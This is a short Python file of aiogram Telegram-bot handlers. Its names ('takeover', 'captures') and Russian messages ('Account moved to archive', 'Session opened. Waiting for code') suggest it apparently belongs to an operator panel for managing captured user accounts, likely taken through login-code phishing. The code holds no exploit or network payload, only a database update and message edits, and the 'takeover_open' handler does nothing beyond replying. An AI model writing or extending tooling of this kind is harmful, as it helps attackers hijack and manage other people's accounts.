from aiogram import Router, F
from aiogram.types import CallbackQuery
from db import get_pool
from keyboards import back_menu

router = Router()

@router.callback_query(F.data.startswith("takeover_arch:"))
async def archive_capture(cb: CallbackQuery):
    cap_id = int(cb.data.split(":")[1])
    async with get_pool().acquire() as conn:
        await conn.execute("UPDATE captures SET archived = TRUE WHERE id = $1", cap_id)
    await cb.message.edit_text("🗄 Аккаунт убран в архив.", reply_markup=back_menu())
    await cb.answer()

@router.callback_query(F.data.startswith("takeover_open:"))
async def open_capture(cb: CallbackQuery):
    cap_id = int(cb.data.split(":")[1])
    await cb.message.edit_text("🔓 Сессия открыта. Жду код.", reply_markup=back_menu())
    await cb.answer()
